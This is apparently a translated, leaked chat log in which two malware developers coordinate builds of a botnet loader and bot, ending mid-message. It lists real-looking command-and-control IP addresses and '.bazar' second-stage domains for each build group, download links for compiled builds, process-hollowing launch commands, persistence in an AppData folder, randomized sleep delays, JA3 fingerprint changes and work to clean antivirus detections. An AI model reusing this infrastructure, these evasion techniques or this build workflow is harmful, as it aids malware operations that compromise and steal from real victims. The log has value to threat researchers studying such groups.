+[13.09.21 15:01:14] collin: Check their skip lists
+[13.09.21 15:01:21] geraldo: Okay.
+[13.09.21 15:03:48] collin: tomorrow at 12-13 MSC, will you be online, can you do the build?
+[9/13/21/15:04:24] geraldo: I can do it. In what mode will you build?
+[13.09.21 15:04:41] collin: x64 regsvr32, 2 different groups
+[13.09.21 15:05:04] geraldo: Ok.
+[13.09.21 16:29:03] collin: most likely x86 regsvr32 build will be needed tomorrow
+[13.09.21 16:29:11] collin: does it work fine for you?
+[9/13/21 16:49:29] geraldo: I will check it. It should work fine. Only there were detects
+[14.09.21 10:25:22] collin: hi!
+[14.09.21 10:25:32] collin: I need build, but later, don't go far!
+[14.09.21 10:25:36] collin: there's a hitch with the addresses
+[14.09.21 10:25:49] geraldo: Hi!
+I see
+[14.09.21 10:49:10] geraldo: I've tested 32-bit bot today:
+```
+c03599fad97666b9ac06239013cc9cf1
+```
+[14.09.21 10:50:22] collin: the exeshniks didn't work, I will have to make a separate group for x86...
+[14.09.21 10:50:25] collin: everything else okay?
+[14.09.21 10:51:02] collin: I see the scripts worked fine
+[14.09.21 10:51:08] collin: So it's okay.
+[14.09.21 10:51:25] geraldo: What about "nop 60"?
+[14.09.21 10:51:37] geraldo: Is this command waiting for answer?
+[14.09.21 10:52:10] collin: changed logics in admin
+[14.09.21 10:52:20] collin: now last nop in waiting - when not received
+[14.09.21 10:52:26] collin: after first nop is always in waiting
+[14.09.21 10:52:35] collin: nop in pending - consider it as current timeout
+[14.09.21 10:52:52] collin: if you set a new nop command - previous one is closed in done
+[14.09.21 10:53:04] geraldo: I see
+[14.09.21 11:01:17] collin: build group 20
+[14.09.21 11:01:23] collin: x64, regsvr32
+[14.09.21 11:01:25] collin: addresses and bazaars:
+[14.09.21 11:01:34] collin: ``
+addresses (domains) of the first stage
+bot:
+172.83.155.173
+89.41.182.139
+194.15.112.159
+194.135.33.179
+
+LOADER:
+194.135.33.179
+194.15.112.159
+172.83.155.173
+89.41.182.139
+
+second stage domains, bot and loader:
+blackrain15.bazar
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[14.09.21 11:01:38] collin: send wild
+[14.09.21 11:01:46] geraldo: Copy that.
+[14.09.21 11:02:06] collin: x64 is needed all the same, customers changed it a hundred times...
+[17.09.21 09:55:54] collin: hi!
+[17.09.21 09:55:57] collin: how are you doing on finalizing the new mode?
+[17.09.21 09:56:03] collin: build with one bot?
+[17.09.21 09:58:10] geraldo: Hi!
+Items 1, 3 of TOR are done.
+[17.09.21 09:59:07] geraldo: I haven't tested all of them together yet.
+[17.09.21 09:59:25] collin: ok
+[22.09.21 13:22:59] geraldo: you leave delay from 1 to 168 hours before first beat? Or leave it off for testing?
+[22.09.21 13:24:42] collin: does delay take into account or not take into account the system time?
+[22.09.21 13:24:55] collin: i.e. if I transfer the time, will I bypass the delay?
+[22.09.21 13:25:11] collin: I start Bk - then I transfer the time
+[22.09.21 13:25:38] geraldo: I haven't tried it. But it's usual Sleep
+[22.09.21 13:30:00] collin: one long Sleep, or by small parts in loop?
+[22.09.21 13:30:14] geraldo: one
+[22.09.21 13:30:37] collin: well, wait with assembly, I'll clarify.
+[22.09.21 13:55:11] geraldo: I made two files: with and without delay
+```
+https://privatlab.com/s/v/aqRRWNaMrjuAn5NO3QQX
+https://privatlab.com/s/d/aqRRWNaMrjuAn5NO3QQX/VErBG#delete
+```
+[22.09.21 13:56:47] geraldo: Started via starter.exe with process hollowing technique, that is in archive:
+starter.exe "C:\path to dll file\bd_pre1_x64_release_nologs_v_1_38.dll"
+[22.09.21 14:14:13] collin: +
+[22.09.21 15:32:21] collin: bd_pre1_x64_release_nologs_v_1_38.dll - with small delay?
+[22.09.21 15:38:35] geraldo: Yes, from 30 seconds to 3 minutes.
+[22.09.21 15:39:01] collin: are there any logged modules?
+[22.09.21 15:39:24] geraldo: The one with _Sleep suffix, that one waits a long time. There are also logical ones.
+[22.09.21 15:39:39] geraldo: I'll send you everything
+[22.09.21 15:39:58] geraldo: Or you don't need them yet?
+[22.09.21 15:41:03] collin: Not yet
+[22.09.21 15:41:06] collin: 172.83.155.173 what kind of address is it?
+[22.09.21 15:41:33] collin: I gave other addresses, this one is old
+[9/22/221 15:43:05] geraldo: I'll fix it. Something got mixed up.
+[22.09.21 15:44:03] collin: okay, leave it for now, don't make a new one
+[22.09.21 15:44:15] collin: how do you call Sleep for delays?
+[22.09.21 15:45:00] geraldo: ``
+pSleep((1 + pGetTickCount() % 167) * 60 * 60 * 1000);
+```
+[22.09.21 15:45:14] collin: obfuscation based on GetApi.h?
+[22.09.21 15:45:19] geraldo: yes.
+[22.09.21 15:45:28] collin: jr
+[22.09.21 15:45:53] collin: there's a solution to reduce and check delays on the crypt level, I'll work on it now
+[22.09.21 15:46:21] geraldo: The basis is GetApi, but it's changed.
+[22.09.21 15:52:41] collin: how long after command execution/sending a report to it
+[22.09.21 15:52:46] collin: the bot picks up the next command?
+[22.09.21 15:54:10] collin: it doesn't hit timings again
+[22.09.21 15:54:11] collin: 846aa1bdb95894d78fb565dce04da6f
+[22.09.21 15:54:25] collin: nop 60, command worked and bot sent report 4 min ago, next one not picking up
+[22.09.21 15:57:48] geraldo: runexe worked, next one should be picked up in 5-10 min
+[22.09.21 15:58:04] collin: why?
+[22.09.21 15:58:16] collin: nop 60,
+[22.09.21 16:01:06] collin: if you count delay between commands as for blocking mode - then 1 - 2 min
+[22.09.21 16:01:18] collin: if you count as for idle, then 30 seconds - 2 minutes
+[22.09.21 16:01:33] collin: 5-10 is irrelevant
+[22.09.21 16:03:09] geraldo: I mess up timings. Alright, I'll make it smaller.
+[22.09.21 16:06:39] geraldo: This is from the task "02. Variable interval bouncing".
+I put timeout=5 minutes, that's why it's so.
+[22.09.21 16:07:40] collin: ``.
+In blocking mode bot periodicity of bouncing (request commands) to server should be with random interval in range from timeout to 2*timeout
+Where timeout is timeout value from last received NOP command, or default value at start (5 minutes).
+```
+[22.09.21 16:07:42] collin: is this what happened?
+[22.09.21 16:08:40] collin: ``
+now the interval between bounces is exact - for example 5 minutes
+as much as the server said in the timeout field
+1. in idle mode (no operation) let the next beat be in a random interval from 30 seconds to 2*timeout
+2. in the command response mode let the next beat be within a random range from timeout to 2*timeout
+
+```
+[22.09.21 16:08:41] collin: or this
+[22.09.21 16:08:58] collin: well, the wording here is not very good, that's why it comes out that way...
+[22.09.21 16:10:02] collin: the wording was clever in the first version of the problem, so it turned out that way
+[22.09.21 16:10:09] collin: I'll add a new task, I'll write it.
+[22.09.21 16:10:37] geraldo: Yes, it seems:
+```
+now we have an exact interval between bounces - for example 5 minutes
+as much as the server said in the timeout field
+1. In idle mode (no operation) let the next interval be between 30 seconds and 2*timeout
+2. in the command response mode, let the next delay be within a random interval from timeout to 2*timeout
+```
+[22.09.21 16:10:38] geraldo: I see
+[22.09.21 16:10:50] geraldo: Got it
+[22.09.21 16:11:00] collin: ``
+System Run_EXE 22.09.21 2021 15:43 done. runexe hollowing 60 explorer tst1pre1X64_v1.exe 1234 %id% 5678 %group%
+```
+[22.09.21 16:11:03] collin: report:
+[22.09.21 16:11:13] collin: ``
+PID: 7672
+Exitcode: 0
+Standart_output: This is stdout test output data 1234567890!@#$%^&*()
+Standart_error: This is stderr test output data !@#$%^&*()1234567890pre1v1
+```
+[22.09.21 16:11:23] collin: it looks like parameters of the line command didn't work, the report would be different
+[22.09.21 16:12:32] geraldo: Yes, the zero character gets into the stream in this exe file, that's why it crashes
+[22.09.21 16:13:18] collin: in the output data?
+[9/22/221 16:13:28] geraldo: It's in my bot. I haven't figured out how to fix it yet. Maybe just delete it.
+[22.09.21 16:13:29] collin: But it worked before
+[9/22/221 16:13:50] geraldo: Nah, it was the same before.
+[22.09.21 16:13:52] collin: when getting from child process breaks or when sending to server?
+[22.09.21 16:14:12] collin: shield it somehow
+[22.09.21 16:14:31] geraldo: When sending to server. Arguments are read, it's checked.
+[22.09.21 16:15:01] geraldo: Otherwise rundll wouldn't work at all
+[22.09.21 16:15:14] collin: by percentage coding escape it
+[22.09.21 16:15:42] collin: it didn't work like that on old proto2 admin, I guess something web coders didn't finish here
+[22.09.21 16:16:38] geraldo: No. I have this problem. When a stream is copied to a string. The same string I concatenate and there's a 0 character.
+[22.09.21 16:17:00] geraldo: That's why the stream is not all copied. I have to fix it.
+[22.09.21 16:18:34] geraldo: You should also see the "runexe hollowing 60 notepad pscp_x64.exe" command.
+For some reason the server doesn't hide the command in cookies.
+[22.09.21 16:19:01] collin: Yes, I noticed, I'll run it on another bot tomorrow
+[22.09.21 16:19:07] collin: something with admin, I suspect it too
+[22.09.21 16:19:10] geraldo: I tried it 3 times yesterday, all the same
+[22.09.21 16:19:35] geraldo: And it is executed separately, if you set it manually
+[22.09.21 16:20:39] geraldo: I get this kind of response:
+```
+HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Date: Tue, 21 Sep 2021 18:47:49 GMT
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+
+
+
+```
+[22.09.21 16:20:39] collin: try to combine as binary arrays, not strings
+[22.09.21 16:21:13] geraldo: Okay.
+[9/23/221 13:55:53] collin: hi!
+[23.09.21 13:56:13] collin: about output stream with zero character - should be something changed in admin, because it was cut like that for me too
+[23.09.21 13:56:36] collin: escaped 0 through %00 - worked fine
+[23.09.21 13:56:43] collin: do the same thing
+[23.09.21 17:08:22] collin: added task 644 - refine by variable output
+[23.09.21 17:08:26] collin: do it first
+[9/23/221 17:30:51] geraldo: hi!
+[24.09.21 11:54:12] collin: hi!
+[24.09.21 11:54:21] collin: do you have generic-glue mode implemented?
+[24.09.21 12:05:49] geraldo: Hi! I haven't tested it yet. Main functionality (copying, restarting) implemented.
+[24.09.21 12:06:08] collin: ok
+[28.09.21 12:03:33] collin: hi!
+[28.09.21 12:03:40] collin: build group g4
+[28.09.21 12:03:51] collin: x64, rundll32(StartW)
+[28.09.21 12:04:02] collin: addresses and bazaars:
+[28.09.21 12:04:04] collin: ``
+addresses (domains) of the first stage
+bot:
+161.35.29.127
+161.35.27.53
+161.35.19.83
+161.35.17.114
+
+LOADER:
+161.35.19.83
+161.35.17.114
+161.35.29.127
+161.35.27.53
+
+second stage domains, bot and loader:
+blackrain15.bazar
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[28.09.21 12:04:07] collin: send nick
+[28.09.21 12:04:43] geraldo: Hi!
+Checked out
+[29.09.21 13:18:34] collin: hello!
+[29.09.21 13:18:45] collin: 1) make one rework first - task 652
+[29.09.21 13:18:49] geraldo: hi!
+[29.09.21 13:18:56] collin: 2) at least since 13:00 Moscow time can you stay in touch?
+[29.09.21 13:19:12] collin: we have rush for a month, one coder is on vacation, then the second one will follow
+[29.09.21 13:22:35] geraldo: I will try. I saw the task.
+[30.09.21 08:47:03] collin: hi!
+[30.09.21 08:47:13] collin: build group g4
+[30.09.21 08:47:33] collin: x64, rundll32(StartW)
+[30.09.21 08:47:37] collin: addresses and bazaars:
+[30.09.21 08:47:47] collin: ``
+addresses (domains) of the first stage
+bot:
+5.183.78.108
+213.59.119.200
+195.133.192.89
+5.181.80.115
+
+LOADER:
+195.133.192.89
+5.183.78.108
+5.181.80.115
+213.59.119.200
+
+second stage domains, bot and loader:
+blackrain15.bazar
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[30.09.21 08:47:52] collin: give me the nick
+[30.09.21 08:48:02] geraldo: Hi!
+Check it out
+[30.09.21 10:49:27] collin: make two more builds
+[30.09.21 10:49:42] collin: 1) group g9, x64, generic
+[30.09.21 10:49:54] collin: 2) group g10, x64, rundll32(ElementID)
+[30.09.21 10:49:57] collin: addresses and bazaars:
+[30.09.21 10:50:06] collin: ``
+addresses (domains) of the first stage
+bot:
+138.68.74.234
+161.35.25.202
+164.90.226.28
+164.90.226.30
+
+LOADER:
+164.90.226.28
+164.90.226.30
+138.68.74.234
+161.35.25.202
+
+second stage domains, bot and loader:
+blackrain15.bazar
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[30.09.21 10:50:11] collin: give out porfirio
+[30.09.21 10:50:24] geraldo: ``Accorded.
+[24.10.21 13:44:44] geraldo: Hello!
+[24.10.21 13:46:25] geraldo: Copy that.
+[24.10.21 14:09:26] geraldo: Okay.
+[24.10.21 14:32:47] geraldo: Done.
+```
+https://file.io/gmOZmzxvnBWx
+```
+[24.10.21 14:33:36] geraldo: In the same archive there are keys for special build. Managed to recover them.
+[24.10.21 14:34:13] geraldo: And rebuilt boot loader for special build (group 20) with these keys
+[24.10.21 14:35:42] geraldo: Loader with these "strange" addresses works fine. It loads the load and runs it.
+[24.10.21 14:36:38] geraldo: Yes.
+[10/24-21 14:37:28] geraldo: Yes. But anyway only boot loader works with them.
+Bot doesn't want to work with them. Commands /id/2 work, others /id/3 and /id/4.
+[24.10.21 14:37:36] geraldo: they don't work
+[24.10.21 14:38:24] geraldo: The /id/3 and /id/4 commands do not work with them. Outputs error 404.
+[24.10.21 14:38:55] geraldo: Yes
+[24.10.21 14:40:33] geraldo: Yes.
+[10/24/21 14:42:05] geraldo: There's also Bitdefender informing that galacteco is in danger:
+[24.10.21 14:45:49] geraldo: ``
+Infected web resource detected
+Hours ago - 17
+
+Component:
+Network threat prevention
+
+We blocked this dangerous page for security reasons:
+https://www.calacatta.com/
+Accessed via: lsass.exe
+Dangerous pages try to install software that may harm your device, collect personal information, or act without your knowledge
+```
+[24.10.21 14:47:34] geraldo: No, the process does not interrupt, only blocks the internet connection
+[24.10.21 14:48:07] geraldo: This pops up in the loop, while bot is going through the addresses
+[10/25/21 11:43:35] geraldo: Hi. Got it.
+[25.10.21 12:03:55] geraldo: Ok
+[10/25/21 15:55:49] geraldo: Good.
+[26.10.21 10:14:10] geraldo: Hello!
+[26.10.21 10:34:23] geraldo: Ok.
+[26.10.21 11:05:02] geraldo: Got it.
+[10/28/221 09:15:54] geraldo: Hi!
+Which groups do you need?
+[28.10.21 09:31:28] geraldo: Three last versions only survived
+```
+https://privatlab.com/s/v/nRbY2rbWXqSrAo2BpXnJ
+https://privatlab.com/s/d/nRbY2rbWXqSrAo2BpXnJ/EGdjY#delete
+```
+[28.10.21 09:35:48] geraldo: Unfortunately, no.(( I only started saving these ones after I had to restore the eluchis from the special build
+[28.10.21 16:42:43] geraldo: Got it
+[28.10.21 16:59:52] geraldo: Does it mean, that several new copies of BC can be started?
+[28.10.21 17:02:36] geraldo: And identifiers can overlap?
+[28.10.21 17:05:20] geraldo: I see.
+[29.10.21 07:45:17] geraldo: Hi!
+[29.10.21 07:51:56] geraldo: Okay, that's what I thought. If you don't terminate it, it will run infinitely by BITS task
+[29.10.21 07:54:51] geraldo: Yes, I can start it little by little.
+[29.10.21 08:52:07] geraldo: Got it.
+[29.10.21 08:53:38] geraldo: Geberic mode?
+[29.10.21 09:33:17] geraldo: ``
+https://privatlab.com/s/v/bYV2NEaRbyI3wjqMEqer
+https://privatlab.com/s/d/bYV2NEaRbyI3wjqMEqer/V73AW#delete
+```
+[29.10.21 11:00:26] geraldo: I did that a long time ago. Yes, the file is deleted after the end of work
+[29.10.21 11:50:29] geraldo: Got it
+[29.10.21 11:52:29] geraldo: You can load file with "drop file" command and run it with "run bat" command
+[29.10.21 14:44:52] geraldo: I'm working on it. I'm having a little trouble with it. I will send you later today.
+[10/29/221 16:32:53] geraldo: Ok. I have to rewrite some things.
+[29.10.21 16:39:03] geraldo: Got it.
+[11/21/221 10:01:39] geraldo: Hi!
+Retrieved
+[01.11.21 11:06:17] geraldo: Done!
+```
+https://privatlab.com/s/v/M9xOknNkgDcB7V3mp35J
+https://privatlab.com/s/d/M9xOknNkgDcB7V3mp35J/r4agj#delete
+```
+[01.11.21 11:17:15] geraldo: The bootloader copies itself and restarts at the first start
+[01.11.21 13:15:22] geraldo: To folder %AppData%\Roaming\OneDrive
+[01.11.21 14:28:59] geraldo: Yes
+[02.11.21 10:14:16] geraldo: Hi!
+Copy
+[02.11.21 11:12:12] geraldo: Some kind of rundll32 command goes out of admin area.
+[02.11.21 11:12:40] geraldo: The argument starts with a filename for some reason.
+[02.11.21 11:12:52] geraldo: Is it supposed to be like that?
+[02.11.21 11:13:20] geraldo: %cmdline% means
+[02.11.21 11:15:33] geraldo: ``
+1f71945a30e70002b41d6b2332276dae
+```
+[02.11.21 11:17:15] geraldo: In rundll32 exactly
+[02.11.21 11:17:35] geraldo: In regsvr32 it does not work like that either.
+[02.11.21 11:17:58] geraldo: It all worked before
+[02.11.21 11:46:34] geraldo: I can take it into account only in next builds. Previous builds can work only with numerical parameter "%pid%".
+[02.11.21 11:47:22] geraldo: Otherwise I get a message box saying that an entry point is not found.
+[02.11.21 12:12:40] geraldo: OK
+[02.11.21 12:14:38] geraldo: I can't load bot into 19r group card.
+[02.11.21 12:15:06] geraldo: I made several attempts with different prefixes. Everything crashes.
+[02.11.21 12:15:51] geraldo: Probably admin.
+Says
+```
+Unknown Property - yii\base\UnknownPropertyException
+Getting unknown property: common\models\Groups::delmode
+```
+[02.11.21 12:16:42] geraldo: Group 25 is fine
+[02.11.21 12:16:55] geraldo: Maybe some rights are missing?
+[02.11.21 12:33:34] geraldo: Is old 11 "rundll" command format completely canceled?
+[02.11.21 12:34:22] geraldo: Ok.
+[02.11.21 13:33:33] geraldo: I fixed rundll command and reflashed bot file
+[02.11.21 13:34:22] geraldo: Yes, so there could be a line
+[02.11.21 13:49:42] geraldo: All works
+[03.11.21 08:49:27] geraldo: Hi!
+Got it
+[03.11.21 13:37:01] geraldo: Do you want to remove delays before bouncing?
+[03.11.21 13:38:07] geraldo: I see.
+[11.03.21 13:39:53] geraldo: I just forgot. In some builds they removed delays recently.
+[03.11.21 16:17:46] geraldo: I see.
+[04.11.21 12:20:51] geraldo: Hi!
+Copy
+[04.11.21 12:57:08] geraldo: Roger that.
+[04.11.21 16:38:36] geraldo: I don't think so.
+[04.11.21 16:43:25] geraldo: He can show me logs
+[09.11.21 12:48:33] geraldo: Hi!
+[09.11.21 13:44:40] geraldo: Roger!
+[09.11.21 14:53:03] geraldo: I use in my LLVM Obfuscator 10 builds the same one, that you gave me some time ago.
+[09.11.21 14:54:17] geraldo: I have built 64-bit clang-cl.exe version 12. I couldn't build it for a long time.
+[09.11.21 14:56:01] geraldo: Only at the third try I could build it. I had to look through LLVM source code because this patch is for v10
+[09.11.21 14:58:46] geraldo: No, but I'll probably try to build it sometime.
+[10.11.21 15:31:26] geraldo: Hi!
+[10.11.21 16:19:36] geraldo: Done!
+```
+https://privatlab.com/s/v/pw65DjLewoi9EJRgGXMe
+https://privatlab.com/s/d/pw65DjLewoi9EJRgGXMe/kDnBE#delete
+```
+[12.11.21 10:08:01] geraldo: Hi!
+Got the archive.
+[12.11.21 15:04:59] geraldo: Got it.
+[12.11.21 15:07:19] geraldo: That's it, I see.)
+[12.11.21 16:01:50] geraldo: Sets send
+[11/15/21 21 08:14:26] geraldo: Hi!
+Got it
+[15.11.21 08:44:20] geraldo: Are addresses workable?
+[11/15/21 08:55:10] geraldo: I have none of them pings
+[11/15/21/221 08:58:19] geraldo: And if you switch off VPN, it's pinginging. What does it mean?
+[11/15/21/221 09:01:33] geraldo: Via VPN this one:
+```
+199.189.108.71
+```
+[11/15/21 09:04:39] geraldo: It turns out that with VPN turned on the Internet doesn't work at all
+[11/15/21/29:05:06] geraldo: It was still working last night
+[11/15/21 09:05:15] geraldo: Ours
+[11/17/21/1121 11:56:11] geraldo: Hi!
+Checked out
+[11/18/21 11:05:26] geraldo: Hi!
+[11/18/21 11:06:28] geraldo: Roger that.
+[11/18/21 11:55:12] geraldo: Done!
+```
+https://privatlab.com/s/v/ZV22ZykNJLIxnByV2elB
+https://privatlab.com/s/d/ZV22ZykNJLIxnByV2elB/a9eNx#delete
+```
+[11/22/11/21 10:29:27] geraldo: Hi!
+Checked and tested the loader in generic glue mode. The first exit is via command return.
+[11/22/11/21 10:32:12] geraldo: Yes, in the one I sent last week.
+[11/22/221 10:33:38] geraldo: Maybe the stack structure is broken. My function header is like this:
+```
+BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+```
+[22.11.21 10:35:07] geraldo: Does it work at all?
+[11/22/11/21 10:35:16] geraldo: Bot doesn't start?
+[11/22/221 10:43:08] geraldo: Copy that.
+[22.11.21 11:25:27] geraldo: Access to group 26, please.
+[22.11.21 11:29:40] geraldo: Something still is not in the list of group 26
+[22.11.21 11:30:25] geraldo: It appeared
+[22.11.21 13:34:08] geraldo: I checked the first one, I am checking the second one
+[22.11.21 13:34:44] geraldo: no response
+[22.11.21 13:57:49] geraldo: Build in persistent1 mode:
+```
+https://privatlab.com/s/v/DBOezB7OlDhWxAEk9RxD
+https://privatlab.com/s/d/DBOezB7OlDhWxAEk9RxD/BoBRj#delete
+```
+[22.11.21 14:18:00] geraldo: Logging works, but it is not finished. I undertook to rewrite it, but I haven't finished writing it in the bot yet.
+[22.11.21 14:19:26] geraldo: I will rewrite it now
+[22.11.21 14:31:30] geraldo: Can you make it bigger or leave it like this?
+[22.11.21 14:36:02] geraldo: ``
+https://privatlab.com/s/v/VDQaopd9xXTW5Zl9JV5n
+https://privatlab.com/s/d/VDQaopd9xXTW5Zl9JV5n/Mp7Yo#delete
+```
+[22.11.21 14:36:13] geraldo: I added dll-file
+[22.11.21 15:27:11] geraldo: Ok
+[24.11.21 12:36:36] geraldo: Hi!
+Do you need to change the ja3 fingerprint only in the loader? You don't need it in bot?
+[24.11.21 12:37:44] geraldo: Is SendHttpsRequest function, which calls functions from winhttp, a test one? You don't need to call it in combat mode, do you?
+[24.11.21 12:38:19] collin: Hi!
+[24.11.21 12:38:47] collin: cipher scheme is changed centrally on the whole system, so we change it only once in lowader
+[24.11.21 12:40:16] collin: SendHttpsRequest - this is sending a test request, to see later what and how is sent by sniffer
+[24.11.21 12:40:23] collin: you need change functionality from ChangeJA3();
+[24.11.21 12:41:25] geraldo: I thought so. Thanks
+[26.11.21 15:25:29] collin: Hi!
+[26.11.21 15:25:35] collin: You need to clean bot from statics on AV
+[26.11.21 15:25:42] collin: added the task
+[26.11.21 15:25:50] collin: do that first, before any other tweaking tasks
+[26.11.21 15:25:52] collin: just for now
+[26.11.21 15:28:25] geraldo: Hi!
+[29.11.21 09:15:02] collin: Hi!
+[29.11.21 09:15:08] collin: make an assembly for new main admin
+[29.11.21 09:15:15] collin: group g11, x64, generic
+[29.11.21 09:15:26] collin: ``
+addresses (domains) of the first stage
+bot:
+162.33.177.196
+162.33.178.35
+162.33.179.103
+162.33.179.88
+
+LOADER:
+162.33.179.103
+162.33.179.88
+162.33.177.196
+162.33.178.35
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[29.11.21 09:15:31] collin: send nick
+[11/29/221 10:21:06] geraldo: Hi!
+Checked out
+[11/30/21 09:21:29] collin: hi!
+[30.11.21 09:22:21] collin: make new build for tst4 x64 generic-glue group
+[30.11.21 09:22:43] collin: ``
+addresses (domains) of the first stage
+bot:
+162.33.177.196
+162.33.178.35
+162.33.179.103
+162.33.179.88
+
+LOADER:
+162.33.179.103
+162.33.179.88
+162.33.177.196
+162.33.178.35
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[30.11.21 09:22:52] collin: send me
+[30.11.21 09:24:02] geraldo: Hi!
+What's the argument (/probe_no_soft)?
+[30.11.21 09:24:48] collin: `/test20211130`
+[30.11.21 09:50:49] geraldo: ``Done!
+```
+https://privatlab.com/s/v/3QWoLxel4Zsj07Z8BJ9O
+https://privatlab.com/s/d/3QWoLxel4Zsj07Z8BJ9O/WzBxz#delete
+```
+[03.12.21 11:25:06] collin: Hi!
+[03.12.21 11:25:23] collin: make a build for the tst4 group
+[03.12.21 11:25:28] collin: x64, generic-glue
+[03.12.21 11:25:41] collin: first stage addresses (domains)
+bot:
+162.33.179.52
+162.33.177.154
+45.61.136.145
+162.33.178.115
+
+LOADER:
+45.61.136.145
+162.33.178.115
+162.33.179.52
+162.33.177.154
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar.
+[03.12.21 11:25:54] collin: send me and odis
+[03.12.21 11:26:39] collin: params_no_soft key: `/tst20211203`
+[03.12.21 11:30:29] geraldo: Hi!
+Got it
+[03.12.21 12:24:46] geraldo: Done!
+```
+https://privatlab.com/s/v/YOG99gWoZLS4BlYM6xz0
+https://privatlab.com/s/d/YOG99gWoZLS4BlYM6xz0/y6jnV#delete
+```
+[03.12.21 12:26:30] collin: +
+[06.12.21 10:57:37] collin: Hi!
+[06.12.21 10:57:41] collin: build group g4
+[06.12.21 10:57:47] collin: x64, regsvr32
+[06.12.21 10:57:56] collin: ``
+addresses (domains) of the first stage
+bot:
+162.33.179.36
+162.33.178.30
+162.33.178.204
+162.33.177.164
+
+LOADER:
+162.33.178.204
+162.33.177.164
+162.33.179.36
+162.33.178.30
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[06.12.21 10:58:00] collin: send wild
+[06/12/21 11:40:35] geraldo: Hi!
+Copy
+[07.12.21 12:08:13] collin: Hi!
+[07.12.21 12:08:15] collin: make assemblies:
+[07.12.21 12:08:37] collin: 1) group g15 - x64, rundll32(SendTask)
+[07.12.21 12:08:52] collin: 2) group 25 - x64, rundll32(AddNewData)
+[07.12.21 12:09:04] collin: ``
+addresses (domains) of the first stage
+bot:
+87.120.37.64
+87.120.8.46
+87.120.37.71
+87.121.52.195
+
+LOADER:
+87.120.37.71
+87.121.52.195
+87.120.37.64
+87.120.8.46
+
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[07.12.21 12:09:07] collin: send wild
+[07.12.21 12:09:17] geraldo: hi!
+Copy
+[07.12.21 13:30:09] collin: do also build group g4 - x64, regsvr32
+[07.12.21 13:30:12] collin: addresses and bazaars:
+[07.12.21 13:30:21] collin: ``
+addresses (domains) of the first stage
+bot:
+87.120.37.179
+87.120.254.112
+162.33.179.241
+162.33.177.86
+
+LOADER:
+87.120.254.112
+162.33.179.241
+87.120.37.179
+162.33.177.86
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[07.12.21 13:30:25] collin: send wild
+[07.12.21 13:30:39] geraldo: Copy that.
+[08.12.21 10:19:11] collin: Hi!
+[08.12.21 10:19:17] collin: how's shuffle 766 doing?
+[08.12.21 10:29:54] geraldo: Hi!
+Already added to the builds.
+[08.12.21 10:30:39] collin: update data in bugtracker then, mark finished shuffles
+[12/13/221 07:41:06] collin: Hi!
+[12/13/221 07:41:14] collin: about redmine
+[12/13/21 07:42:02] collin: 1) the 480 taskk - some time ago I checked your build on win11, everything works correctly. Can you close the taskk, or are you doing something else within it?
+[12/13/221 07:42:17] collin: 2) what's the progress on the 666 task?
+[12/13/221 07:45:18] geraldo: Hi!
+I made truncation in the 666 task and fixed the number of iterations.
+[12/13/221 07:46:35] geraldo: I also wanted to check pauses.
+[12/13/221 07:47:49] geraldo: I haven't done anything in task 480 yet. I wanted to test some more commands.
+[12/13/221 07:50:16] geraldo: I'm working on dll-library injection (task 663) and I need to change the loader a bit, it has some problems with detects.
+It compiles with detects every now and then.
+[12/13/221 07:51:05] collin: ok
+[12/13/221 07:51:23] collin: what about 583?
+[12/13/221 07:58:03] geraldo: There are no noise requests in the Loider.
+The module for sending noise queries is made so that it's executed inside the "try except" block.
+And loader isn't friendly with exception handling, that's why I haven't added it yet.
+[13.12.21 07:58:53] geraldo: The rest of this task is done.
+[12/13/221 07:59:23] collin: add it into the taskbar, I'll forget again in a week and ask you the same thing
+[12/13/221 08:04:15] geraldo: Ok. I added it to the note.
+[12/13/21/2011 11:50:42] collin: Build it.
+[12/13/21 11:51:03] collin: group g15, x64, rundll32(LoadDeviceA)
+[12/13/21 11:51:25] collin: ``
+first stage addresses (domains)
+bot:
+94.140.113.0
+194.29.101.118
+103.124.106.174
+
+LOADER:
+103.124.106.174
+194.29.101.118
+94.140.113.0
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[12/13/221 11:51:28] collin: send wild
+[12/13/21 13:02:58] geraldo: Copy that.
+[12/14/21 14:26:38] collin: Hey!
+[14.12.21 14:27:24] collin: last week 4 times I handed the build task I wanted to give to you - to another coder
+[14.12.21 14:27:38] collin: due to the fact that you're not online, it's on weekdays around 14-16 msk
+[14.12.21 14:27:54] collin: That's no good.
+[14.12.21 14:28:17] collin: you need to be online during the day at a previously known time, ready to accept and complete the task
+[14.12.21 14:28:24] collin: from 13 to 17 Moscow time, maybe another time
+[14.12.21 14:29:03] collin: if you can't do it from 13 to 17 Moscow, you decide when you are online and what time I can count on you
+[14.12.21 14:29:33] collin: daytime between 11 and 17 Moscow time
+[14.12.21 14:30:08] collin: if you're not online at the agreed time, just let me know in advance
+[14.12.21 14:30:46] collin: this is not the first time I raise this question - about working hours, why do I always have to write the same thing
+[14.12.21 14:42:16] geraldo: Hi!
+Evening would be more convenient (after 17:00).
+Ok, I'll be there from 13:00.
+[14.12.21 14:42:36] geraldo: I thought the rush was over.
+[12/14/221 14:44:21] collin: after 17:00 one-time orders are rare, you still need it in the daytime
+[12/17/221 07:51:38] collin: hi!
+[12/17/21 07:51:44] collin: make an assembly of group g15
+[12/17/21 07:51:56] collin: x64, rundll32(CheckResource)
+[12/17/221 07:52:04] collin: ``
+addresses (domains) of the first stage
+bot:
+87.120.254.243
